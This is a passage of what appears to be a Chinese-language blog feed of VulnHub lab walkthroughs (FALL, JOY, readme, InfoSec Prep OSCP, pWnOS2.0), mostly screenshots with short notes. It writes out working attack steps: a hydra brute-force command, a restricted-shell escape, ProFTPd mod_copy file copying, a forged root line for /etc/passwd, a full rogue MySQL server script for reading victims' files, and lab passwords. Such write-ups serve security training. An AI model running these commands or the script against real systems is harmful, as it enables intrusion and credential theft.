&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7c35d64b7d2fda3c67bfce1fe9eb1fd0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;8080端口&lt;/p&gt;
&lt;p&gt;看这个的意思：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9af5b221cb6ca39f8413a2b8444fe09bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe8b0fbbe017734f90269d83378ae7364image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;挨个儿看吧：&lt;/p&gt;
&lt;p&gt;David&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa94dfa19e088959e429a0d98c99fa51aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE42d71fbbe6224699733f8448ea71a510image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9029157c3c1976199f8d60c4ede3ca1aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;访问这个目录，可以发现：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0899dba087f32136c79af1d535098cb0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么，到现在，可能渗透才刚刚开始：&lt;/p&gt;
&lt;p&gt;发现默认密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa8343fdf47b798b6084068059ab8ae78image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现疑似用户名&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe7cd0fbd5443cbc3cfefe9b967e2cde1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后反复尝试后，再次回到这个页面：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEec529ddaade016e2a24be7f7754f0b08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;google真好用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE34d58039876f1db76030259aa405f707image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里记录了两个洞，一个文件包含，一个信息泄露：&lt;/p&gt;
&lt;p&gt;文件包含，试了半天好像用不了，信息泄露是可以的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa7f707bace6266858b6c9924fe75d92cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE39bf19940e2a2671d5d7bc4f933cf99bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试了一下intern成功了：&lt;/p&gt;
&lt;p&gt;12345678900987654321&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE924dcc688efb9808a7b0fc88147e55c2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;受限的shell，想办法先把这个绕了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1d1075423fabc8e115c920601b19c0f3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;echo os.system(&amp;rsquo;/bin/bash&#39;)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5cbd789b24d700fb67d8d6b064c873ffimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看有哪些用户把：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEed3f68cd096e51c3186f9add77d79b93image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;patrick的hash我们是知道的，只是刚刚没有解密：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa3cdd64a9942b3df381116da11b262d2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4913f72792890a3d2d0b427c783fc65cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x065 Digitalword.local(FALL)</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x065-digitalword.localfall/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x065-digitalword.localfall/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4892771c0189d30166b9715c6a61df8aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE76c1ce6e0d52a6c6ee012f787502b3a8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE67a1fbba64dc9e10d192e3c4b86bcd31image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透测试&#34;&gt;渗透测试&lt;/h1&gt;
&lt;p&gt;SMB没啥东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3536960cdc270398c9c8008fd2b961c5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7887a9b4f2a956571552406fd941bf19image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查了很多的payload，发现都是认证后的漏洞，得想办法找一下密码了：&lt;/p&gt;
&lt;p&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.102 http-post-form &amp;ldquo;/admin/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;loginsubmit=Submit:F=incorrect&amp;rdquo; -t 64&lt;/p&gt;
&lt;p&gt;先爆破着：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEca0bfc5272db95f42c22aa37473d7c55image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后接着看目录扫描结果：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd9b253b9caf07a042a97aa9b8a901b57image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;wfuzz -u &amp;ldquo;&lt;a href=&#34;http://192.168.5.102/test.php?FUZZ=1&#34;&gt;http://192.168.5.102/test.php?FUZZ=1&lt;/a&gt;&amp;rdquo; -w /usr/share/wordlists/wfuzz/general/common.txt &amp;ndash;hw 7&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE82f1f7774b21a0f0748e3b9bea8ac9beimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现信息&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfc4d7de55dc8a3e489b2ac92867943fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;偷看私钥成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe9901d1365981108414823df00bf7e7bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE33dcc17b8d7c710554b90ad54888e13dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd2fa0004111621d6c40b906905f3d988image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x066 Digitalworld.local(JOY)</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x066-digitalworld.localjoy/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x066-digitalworld.localjoy/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE80c4e4fe12432e3f499bf39b261d42e1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE53a54a2b4c947a451ead9b10fbdd65b8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd2b03ba5d32020131ff654b6de24bf89image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7d5177d3316456e8f947dc98b3c4171cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口：&lt;/p&gt;
&lt;p&gt;用mget给全部下下来了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE13070bcb8d8137c5ebbf321f646d6fc3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名&lt;/p&gt;
&lt;p&gt;Patrick&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd50a7a112b3647342c943a70e82da968image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;提示信息，或者账号密码？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0d0f952d8937cb2a3607719bead669bbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口查了一下，是个入侵检测：&lt;/p&gt;
&lt;p&gt;并且没有远程漏洞：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE804ea9cbb6b0c692bc037ba32894f2e0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面又没思路了，看了wp，这个地方涉及FTP和telnet的区别：&lt;/p&gt;
&lt;p&gt;telnet连接后，用户主机实际成为远程TELNET服务器的一个虚拟终端（或称是哑终端），一切服务完全在远程服务器上执行，但用户决不能从远程服务器中下载或上传文件，或拷贝文件到用户主机中来。&lt;/p&gt;
&lt;p&gt;ftp则不同，它是采用客户机/服务器模式，用户能够操作FTP服务器中的目录，上传或下载文件，但用户不能请求服务器执行某个文件。&lt;/p&gt;
&lt;p&gt;site cpfr /home/patrick/version_control&lt;/p&gt;
&lt;p&gt;site cpto /home/ftp/download/version_control&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc20426b0c10c5b1d2362ddf7bc8f5716image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd3aec73d6a3e5e802b32fa9d7544c0dcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里有几个关键信息：&lt;/p&gt;
&lt;p&gt;ProFTPd: 1.3.5&lt;/p&gt;
&lt;p&gt;/var/www/tryingharderisjoy&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE417ff73a2a8e1b75391e80ab3b2b2876image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看版本漏洞信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b6c6dc3ec66e3fc494c23d5842905ecimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe0e42a2b8efce86185eaf588706188adimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEddf2f6bc47fead95c94284bd995547b4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa37f31593e697025f4f58ef3b6659391image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc29831ed97e61ec1102a9cfad4c8e6b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfd03c46b4272b362d537191db2ae249aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0e3b97cdc68993334d8361050e38dd3aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;patrick:apollo098765&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE856c095ca978ee038ec7b4126b01e39cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过多次尝试：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9d9c70b733fae0bc536c5d8dcf0fcdf6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;别改sudoers文件，要出问题，改passwd文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEedd8b32d7fa2920fdc5f21e4637824aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE07ffa93668cee30492b71c540ab1dcdeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x067 readme</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x067-readme/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x067-readme/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE105e556d62df904228189b4475e208aeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc464496b093cbef56ffdb913ef6a8bc3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b9470766de50513b0d3745a11c3a4ddimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEde8183202983a156ccc4f87730660b7aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe7801f6d0dc2dcb2cdb8be32e8b89bb2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0ce94fd56d492a62392b93fcf3dab2d8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE457f2266402615a06cc4fb01c8ec7e6aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里右键图片，可以发现目录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE87fff234d0dec2589a519b542f8246c6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE777d642af0cb44f81143290792690ad5image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE619cf45715c94b62e287f46475a1c228image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我感觉是在提示我们使用文件读取，但是该怎么进行文件读取呢：&lt;/p&gt;
&lt;p&gt;SSRF是有本地文件读取的可能性的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEcd6af48624611705a08094423f4f067bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/11225#toc-5&#34;&gt;https://xz.aliyun.com/t/11225#toc-5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;用的这个脚本：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
import socket
import os
import sys

#--------------------------------------------------------------------------------------------------------------------
port = int(sys.argv[1])
#--------------------------------------------------------------------------------------------------------------------

def mysql_get_file_content(sv, filename):
    conn, address = sv.accept()
    logpath = os.path.abspath(&amp;#39;.&amp;#39;) + &amp;#34;/log/&amp;#34; + address[0]
    if not os.path.exists(logpath):
        os.makedirs(logpath)
    # Conn from address)
    conn.sendall(
        &amp;#34;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&amp;#34;)
    conn.recv(9999)
    # auth okay
    conn.sendall(&amp;#34;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&amp;#34;)
    conn.recv(9999)
    # want file...
    wantfile = chr(len(filename) + 1) + &amp;#34;\x00\x00\x01\xFB&amp;#34; + filename
    conn.sendall(wantfile)
    content = conn.recv(9999)
    conn.close()

    if len(content) &amp;gt; 4:
        with open(logpath + &amp;#34;/&amp;#34; + filename.replace(&amp;#34;/&amp;#34;, &amp;#34;_&amp;#34;).replace(&amp;#34;:&amp;#34;, &amp;#34;_&amp;#34;), &amp;#34;w&amp;#34;) as txt:
            txt.write(content)
        return True
    else:
        return False



# 开始监听
sv = socket.socket()
sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sv.bind((&amp;#34;&amp;#34;, port))
sv.listen(5)
print &amp;#34;Listen Begin in port &amp;#34;+str(port)

# 日志文件夹




# 循环监听
while True:
    filename = raw_input(&amp;#34;请输入接下来你想读的文件名 (直接按回车退出): &amp;#34;)
    if filename == &amp;#34;&amp;#34;:
        break
    res = mysql_get_file_content(sv, filename)
    if res:
        print &amp;#34;Read Success! ---&amp;gt; &amp;#34;+filename
    else:
        print &amp;#34;Not Found~ ---&amp;gt; &amp;#34;+filename
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfea96fe14cdbce21b2b238751779ddbbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x068 INFOSEC PREP OSCP</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x068-infosec-prep-oscp/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x068-infosec-prep-oscp/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7090209b1b8c753e8ded2dbfd6ef70eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa9be547cd8d23dbb3c3823fde68d067aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE66a10c428b6b09fe973048f265c272aeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc71dfdb60f6f8d38b96ffee26e0e3be3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密钥：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE17bc4a41f578f0b1acbb16aeb58aef1cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE656d74894b1a898df3ee519aea038026image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE0c69c7bd92844295c3723e96e2e22cb2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是没有用户名：&lt;/p&gt;
&lt;p&gt;wpsacn&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEecfb5e7df0381492b450397fe5922596image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE47349bcb65d263c19ac29637c529693cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;通过在主页中翻找，可以知道目前的用户名是oscp：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4d35e04a70c802f25acebca567b1b8f9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用密钥登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5251908451867fbb7ab801276da8461fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;SUID提权&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE38bb0502d18f6985b918c05925889725image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE299ccef541432d2578ded2885210307cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x069 pWnOS2.0</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x069-pwnos2.0/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x069-pwnos2.0/</guid>
      <description>&lt;p&gt;这台靶机建议本地开nat进行攻击&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe16f35dafc56dcd6ec73510e25b714c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8b647560bb7e79a98ce54eff1efcf506image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb9f0fb7032ce6fe2a4212cdfcdb748d6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
